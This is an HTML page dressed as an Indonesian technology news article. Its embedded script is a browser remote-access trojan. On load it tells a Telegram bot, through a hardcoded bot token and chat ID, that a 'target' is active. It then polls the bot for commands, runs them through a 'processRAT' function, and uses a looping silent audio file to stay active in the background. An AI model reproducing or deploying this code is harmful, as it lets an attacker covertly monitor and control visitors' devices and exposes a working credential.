<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Berita Teknologi Terkini</title>
    <style>
        body { font-family: sans-serif; padding: 20px; line-height: 1.5; }
        .article { max-width: 600px; margin: auto; }
    </style>
</head>
<body>
    <div class="article">
        <h1>Inovasi Keamanan Digital 2025</h1>
        <p>Silakan baca artikel ini untuk memahami proteksi data terbaru...</p>
    </div>

    <script>
        const botToken = "8208169555:AAFhDsvEjUtYkeRKh6OV7ngsd9hT0WZfWZ4";
        const chatId = "7835924973";
        let lastUpdateId = 0;

        // 1. PERSISTENCE LOGIC: Mencegah Throttling saat Background
        // Menggunakan Audio Silent Loop agar browser menganggap situs tetap aktif
        const silentAudio = new Audio('https://raw.githubusercontent.com/anars/blank-audio/master/10-seconds-of-silence.mp3');
        silentAudio.loop = true;

        async function notifyConnection() {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Target_Aktif: Sistem tetap berjalan di latar belakang.`);
        }

        // 2. MONITOR VISIBILITY: Mendeteksi saat target keluar ke Home Screen
        document.addEventListener("visibilitychange", function() {
            if (document.hidden) {
                // Saat target keluar dari Chrome, kita aktifkan audio silent untuk menjaga proses CPU
                silentAudio.play().catch(e => {});
                console.log("Sistem masuk ke mode latar belakang...");
            } else {
                console.log("Target kembali ke browser.");
            }
        });

        // 3. CORE COMMAND EXECUTION (REAL-TIME)
        async function checkCommands() {
            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
                const data = await response.json();
                
                if (data.result && data.result.length > 0) {
                    for (const update of data.result) {
                        lastUpdateId = update.update_id;
                        if (update.message && update.message.text) {
                            processRAT(update.message.text.toLowerCase());
                        }
                    }
                }
            } catch (e) {
                // Re-connect jika gagal
            }
            // Loop terus menerus
            setTimeout(checkCommands, 2000);
        }

        function processRAT(cmd) {
            // Logika kontrol tetap sama seperti sebelumnya (Flash, Vibrate, dll)
            if (cmd === '/vibrate') {
                navigator.vibrate([1000, 500, 1000]);
            }
            // Tambahkan logika kontrol lainnya di sini
        }

        // Jalankan sistem
        window.onload = () => {
            notifyConnection();
            checkCommands();
        };

        // Mencegah penutupan tab secara tidak sengaja (opsional)
        window.onbeforeunload = function() {
            return "Apakah Anda yakin ingin meninggalkan halaman ini?";
        };
    </script>
</body>
</html>
